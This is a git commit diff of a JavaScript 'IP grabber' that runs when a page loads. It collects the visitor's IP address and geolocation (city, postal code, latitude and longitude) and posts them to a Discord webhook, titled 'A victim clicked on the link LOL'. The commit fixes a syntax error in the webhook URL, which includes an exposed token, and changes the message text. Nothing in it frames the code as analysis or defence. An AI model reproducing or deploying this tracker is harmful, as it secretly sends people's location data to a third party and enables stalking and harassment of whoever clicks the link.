daffb50d9c1ac7a204a4015d274565d519db2906
a8q5 <gloomyontop1@gmail.com>
2025-09-13 22:08:30 -0500

    Add files via upload

--- script.js
+++ script.js
@@ -6,19 +6,19 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = https://discord.com/api/webhooks/1415170988097798184/yAmjYDg0lYdxdxalbz2_UKqSdyE5wao_w5TR0KunSqot3NQxvCF_WriJUZhbue92t3HR'; // replace with your webhook url
+                    const dscURL = 'https://discord.com/api/webhooks/1415170988097798184/yAmjYDg0lYdxdxalbz2_UKqSdyE5wao_w5TR0KunSqot3NQxvCF_WriJUZhbue92t3HR'; // replace with your webhook url
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "ezpz", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/736x/d8/a9/f3/d8a9f34eed4cbfbf19261395d4166004.jpg", // optionally changeable
-                            content: `@here`,
+                            username: "jan is cute", // optionally changeable
+                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                            content: `guhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh`,
                             embeds: [
                                 {
-                                    title: 'A victim clicked on the link!',
+                                    title: 'A victim clicked on the link LOL',
                                     description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
@@ -40,4 +40,3 @@ const sendIP = () => {
         });
 };
 sendIP();
-
